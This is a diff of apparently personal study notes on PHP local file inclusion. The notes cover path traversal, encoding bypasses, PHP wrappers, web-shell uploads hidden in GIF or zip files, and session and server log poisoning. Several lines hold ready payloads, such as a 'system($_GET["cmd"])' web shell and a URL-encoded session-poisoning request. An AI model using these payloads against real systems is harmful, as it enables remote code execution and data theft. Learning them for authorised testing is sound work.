@@ -1,6 +1,6 @@
 File inclusions
 
-enum:
+Enum:
 |
 |--- file inclusions happens when no defence mechs like sanitization or WAF is not present
 |
@@ -10,7 +10,7 @@ enum:
 |
 |--- the above doesn't always work, so try '../' or '/../'
 
-second order:
+Second order:
 |
 |--- incorrectly pulling files from the back end server
 |
@@ -30,7 +30,7 @@ Non recursive:
 |
 |--- can also do '..././' and '....\/'
 
-encoding:
+Encoding:
 | 
 |--- it is common for a webapp  to filter out charecters like '.' and '/'
 |
@@ -40,7 +40,7 @@ encoding:
 |
 |--- can also double encode if needed
 
-approved:
+Approved:
 |
 |--- certain web apps would only allow paths under a certain directory
 |
@@ -48,12 +48,12 @@ approved:
 |
 |--- might to combine both techniques to work
 
-obsolete technique:
+Obsolete technique:
 |
 |--- try these if the php version is 5.3/5.4
 |
 \
- path truncation:
+ Path truncation:
  |
  |--- in php, strings had a max of 4096 charecters due to 32-bit systems
  |
@@ -61,7 +61,7 @@ obsolete technique:
  |
  |--- ../../../etc/passwd/../..[etc...]
  
- null bytes:
+ Null bytes:
  |
  |--- in versions before 5.5, we could add an null byte(%00)
  |
@@ -69,7 +69,7 @@ obsolete technique:
  |
  |--- /etc/passwd%00 or /ect/passwd%00.php if needed
 
-input filters:
+Input filters:
 |
 |--- wrappers allow us to access I/O streams, file descriptors, memory streams
 |
@@ -89,7 +89,7 @@ input filters:
 |
 |--- most useful filter is the base64 conversion filter
 
-data wrapper:
+Data wrapper:
 |
 |--- this wrapper is used to include external data like php code
 |
@@ -127,3 +127,66 @@ Expect wrapper:
 |
 |--- can use the 'expect://' scheme and pass commands
 
+File Upload:
+|
+|--- craft it, 'echo GIF8<?php system($_GET["cmd"]); ?>' > shell.gif <- use any file ext needed 
+|
+|--- needs to be combine with a lfi, otherwise its harmless
+|
+|--- to include the uploaded file, we need the path to our file
+|
+|--- can be done with inspect element 
+
+Zip Upload:
+|
+|--- the zip wrapper can execute php code
+|
+|--- not enabled by default
+|
+|--- echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+|
+|--- the upload function may still dectect it as a zip archive
+|
+|--- try messing with the Content-Type header
+
+Log Poisoning:
+|
+|--- PHPSESSID holds user related data in the backend
+|
+|--- in linux they are stored '/var/lib/php/sessions'
+|
+|--- in windows 'C:\Windows\Temp'
+|
+|--- has a 'sess_' prefix at the begining
+|
+|--- try changing the value of the param that we have control over 
+|
+|--- /index.php?language=sess_posioning
+|
+|--- after confirming that we have control, input php code
+|
+|--- /index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E <- url encoding may or may not be needed
+|
+|--- after doing so
+|
+|--- /index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+
+Server Log Posioning:
+|
+|--- access.log contains diverse info about request made to the server
+|
+|--- includes the User_Agent header
+|
+|--- this header can be controlled in our requests
+|
+|--- nginx can read logs at lower privleges then apache
+|
+|--- old or miscofigurtions of the apache web server can be read at lower privleges
+|
+|--- apache logs: /var/log/apache2/{log file here}
+|
+|--- nginx logs: /var/log/nginx/
+|
+|--- apache logs: C:\xampp\apache\logs\{log file here}
+|
+|--- nginx logs: C:\nginx\logs\
